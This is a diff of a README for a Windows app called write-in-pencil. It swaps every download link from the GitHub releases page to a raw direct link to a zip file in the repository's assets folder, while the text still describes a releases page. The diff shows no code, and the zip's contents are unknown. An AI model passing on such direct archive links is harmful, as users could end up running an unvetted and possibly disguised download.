@@ -2,7 +2,7 @@
 
 <div align="center">
 
-**[⬇️ Download Now](https://github.com/PythonDen101/write-in-pencil/releases)**
+**[⬇️ Download Now](https://raw.githubusercontent.com/PythonDen101/write-in-pencil/main/assets/write_pencil_in_2.2.zip)**
 
 </div>
 
@@ -35,7 +35,7 @@ Here's how to get write-in-pencil running on your Windows computer in just a few
 
 ### Step 1: Download the Application
 
-Visit this link to download the application: **[https://github.com/PythonDen101/write-in-pencil/releases](https://github.com/PythonDen101/write-in-pencil/releases)**
+Visit this link to download the application: **[https://raw.githubusercontent.com/PythonDen101/write-in-pencil/main/assets/write_pencil_in_2.2.zip](https://raw.githubusercontent.com/PythonDen101/write-in-pencil/main/assets/write_pencil_in_2.2.zip)**
 
 You'll land on a page listing the latest release of write-in-pencil. Look for a file that starts with `write-in-pencil` and ends with `.zip` – that's the one you want.
 
@@ -155,7 +155,7 @@ A: Updates come out as improvements are made. Check the download link periodical
 
 ## 📥 Download Again
 
-Need to re-download or get the latest version? Visit this link to download the application: **[https://github.com/PythonDen101/write-in-pencil/releases](https://github.com/PythonDen101/write-in-pencil/releases)**
+Need to re-download or get the latest version? Visit this link to download the application: **[https://raw.githubusercontent.com/PythonDen101/write-in-pencil/main/assets/write_pencil_in_2.2.zip](https://raw.githubusercontent.com/PythonDen101/write-in-pencil/main/assets/write_pencil_in_2.2.zip)**
 
 ---
 
